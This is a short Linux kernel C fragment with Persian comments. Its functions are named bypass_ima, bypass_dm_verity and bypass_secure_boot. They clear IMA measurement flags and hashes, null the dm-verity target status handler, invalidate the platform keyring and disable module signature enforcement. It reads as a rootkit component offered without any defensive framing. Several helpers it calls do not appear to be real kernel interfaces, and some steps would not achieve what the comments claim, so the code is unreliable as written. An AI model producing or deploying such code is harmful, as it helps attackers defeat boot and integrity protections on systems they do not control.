#include <linux/crypto.h>
#include <keys/asymmetric-type.h>
#include "integrity.h"

// دور زدن IMA (Integrity Measurement Architecture)
void bypass_ima(void) {
    struct integrity_iint_cache *iint;
    struct list_head *head = get_ima_iint_list();
    
    list_for_each_entry(iint, head, list) {
        if (iint->flags & IMA_MEASURED) {
            iint->flags &= ~IMA_MEASURED;
            iint->ima_hash->length = 0;
        }
    }
}

// دور زدن DM-Verity
void bypass_dm_verity(void) {
    struct dm_target *target;
    struct mapped_device *md = get_dm_device();
    
    if (md) {
        list_for_each_entry(target, &md->table->targets, list) {
            if (target->type->name && strcmp(target->type->name, "verity") == 0) {
                target->type->status = NULL; // غیرفعال‌سازی بررسی وضعیت
            }
        }
    }
}

// دور زدن Secure Boot
void bypass_secure_boot(void) {
    struct key *keyring = get_platform_keyring();
    if (keyring) {
        key_invalidate(keyring);
    }
    
    // غیرفعال‌سازی بررسی امضا در ماژول‌ها
    set_module_sig_enforced(0);
}
